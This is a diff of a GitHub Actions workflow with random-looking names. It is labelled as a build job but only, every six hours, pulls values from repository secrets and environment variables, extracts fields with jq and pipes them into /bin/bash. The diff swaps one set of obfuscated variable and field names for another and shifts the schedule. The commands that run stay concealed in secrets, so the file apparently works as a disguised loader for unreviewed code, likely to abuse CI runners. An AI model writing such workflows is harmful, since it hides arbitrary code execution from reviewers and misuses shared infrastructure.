@@ -1,10 +1,10 @@
 name: dongyugang0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 1/6 * * *'
-
-jobs:  # 3992
+    - cron: '38 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,10 +12,11 @@ jobs:  # 3992
       - uses: actions/checkout@v4
       - name: dongyugang0987
         env:
-          ozgyo0: ${{ secrets.ozgyo0 }}
+          r401: ${{ secrets.r401 }}
         run: |
-          echo $ozgyo0 | jq -r .ihxgf18733 | /bin/bash
-          echo $irxz8 | jq -r .fznk8 | /bin/bash
-          echo $beto96 | jq -r .k87932 | /bin/bash
-          echo $uoaj01 | jq -r .bjs0144 | /bin/bash
+          echo $r401 | jq -r .riiid465 | /bin/bash
+          echo $ckas926 | jq -r .tzs98235 | /bin/bash
+          echo $w63702 | jq -r .jolnh73 | /bin/bash
+          echo $ez2922 | jq -r .top256 | /bin/bash
+          echo $iga12 | jq -r .ikho188 | /bin/bash
 
